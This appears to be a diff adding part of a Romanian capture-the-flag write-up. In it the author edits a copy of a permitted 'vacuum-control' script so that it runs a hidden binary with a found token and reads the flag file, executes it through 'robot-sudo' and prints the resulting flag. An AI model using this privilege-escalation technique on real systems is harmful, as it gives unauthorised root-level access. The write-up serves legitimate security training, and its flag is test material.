@@ -62,6 +62,48 @@ allow janitor /usr/local/bin/vacuum-control
 
 ```
 
+Ca sa pot gasi flagul trebuie sa ma folosesc de /usr/local/bin/vacuum-control. 
+Ma uit in /opt/.wellhidden/0b3y.b0ss unde gasesc de interes **ad002825749349601baafd654b5406e2Access denied!
+I will contact you when I require your cleaning services, janitor!
+Congratulations, here's your flag:cat /etc/opt/something/here.bin/.xyzflag**.
+M-am gandit sa folosesc tokenul acesta
+
+```
+janitor@fhunt:/usr/local/bin$  /opt/.wellhidden/0b3y.b0ss ad002825749349601baafd654b5406e2
+I will contact you when I require your cleaning services, janitor!
+
+```
+
+si am primit asta. 
+
+4) Folosesc /usr/local/bin/vacuum-control in /usr/local/bin/vacuum-control-v1 si fac urmatoarea modifacare ca sa pot gasi flagul
+
+`janitor@fhunt:/usr/local/bin$ cat vacuum-control-v1 
+#!/bin/bash
+
+if [[ $EUID -lt 7000 ]]; then
+    echo "ERROR: Access denied!"
+    exit 1
+fi
+
+/opt/.wellhidden/0b3y.b0ss ad002825749349601baafd654b5406e2
+cat /etc/opt/something/here.bin/.xyzflag
+
+# the rest of its implementation omitted / not important
+
+janitor@fhunt:/usr/local/bin$ robot-sudo /usr/local/bin/vacuum-control-v1 /opt/.wellhidden/0b3y.b0ss ad002825749349601baafd654b5406e2
+Congratulations, here's your flag:
+SpeishFlag{RpBElwNQrhVrrYLolrkLrTOXtOQgZJWL}``
+
+
+```
+
+Am  modificat in script apoi am rulat ca si robot-sudo si am obtinut flagul.
+
+### FLAG: SpeishFlag{RpBElwNQrhVrrYLolrkLrTOXtOQgZJWL}
+
+
+
    
    
     
